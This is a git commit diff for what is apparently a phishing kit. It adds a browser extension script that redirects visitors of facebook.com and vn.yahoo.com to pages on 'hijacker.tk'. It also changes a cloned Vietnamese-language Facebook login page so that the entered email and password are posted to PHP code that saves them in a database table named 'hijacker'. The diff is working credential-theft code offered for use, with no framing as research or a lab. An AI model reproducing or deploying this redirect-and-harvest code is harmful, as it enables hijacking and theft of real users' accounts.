f58106ffa4c4c9e75575d880ad29cfb16e805f2d
Lê Dũng <ledung.itsme@gmail.com>
2021-07-15 07:34:01 +0000

    Done

---
+++ Extension/script.js
@@ -0,0 +1,7 @@
+if (window.location.hostname == "www.facebook.com") {
+    window.location.href = "https://hijacker.tk/FB/";
+}
+
+if (window.location.hostname == "vn.yahoo.com") {
+    window.location.href = "https://hijacker.tk/Yahoo/";
+}
--- FB/index.php
+++ FB/index.php
@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -11,6 +12,7 @@
     <script src="js/fontawesome.min.js"></script>
     <script src="js/main.js"></script>
 </head>
+
 <body>
     <div class="container-fluid">
         <div class="content-fb">
@@ -24,21 +26,22 @@
                             <div class="login-box bg-light d-flex justify-content-center align-items-center">
                                 <i class="fas fa-plus-circle text-primary h1 align-middle"></i>
                             </div>
-                            <div class="bg-white p-2 text-center text-primary"><a href="#">Thêm tài khoản</a></div></div>
+                            <div class="bg-white p-2 text-center text-primary"><a href="#">Thêm tài khoản</a></div>
+                        </div>
                     </div>
                 </div>
                 <div class="col-sm-4">
                     <div class="mt-5">
                         <div class="card shadow border-0">
                             <div class="card-body">
-                                <form action="#">
+                                <form method="POST">
                                     <div class="form-group">
-                                        <input class="form-control form-control-lg" type="text" id="email" placeholder="Email hoặc số điện thoại">
+                                        <input class="form-control form-control-lg" type="text" name="email" id="email" placeholder="Email hoặc số điện thoại">
                                     </div>
                                     <div class="form-group">
-                                        <input class="form-control form-control-lg" type="text" id="pwd" placeholder="Mật khẩu">
+                                        <input class="form-control form-control-lg" type="password" name="pwd" id="pwd" placeholder="Mật khẩu">
                                     </div>
-                                    <button type="button" class="btn btn-primary btn-lg btn-block">Đăng nhập</button>
+                                    <button type="submit" class="btn btn-primary btn-lg btn-block">Đăng nhập</button>
                                     <div class="text-center font-weight-bold mt-3"><a href="#">Quên mật khẩu</a></div>
                                     <hr>
                                     <div class="text-center">
@@ -56,4 +59,27 @@
         </div>
     </div>
 </body>
+
 </html>
+
+
+<?php
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+require_once './db.php';
+require_once './config.php';
+
+if (isset($_POST['email']) && isset($_POST['pwd'])) {
+    $db = new Database();
+    try {
+        $db->insertInto('hijacker', 'username, password, type', ':username, :password, :type')
+            ->execute(array(
+                'username' => $_POST['email'],
+                'password' => $_POST['pwd'],
+                'type' => 'facebook'
+            ));
+    } catch (\Exception $e) {
+        throw new \Exception('Nothing here');
+    }
+}
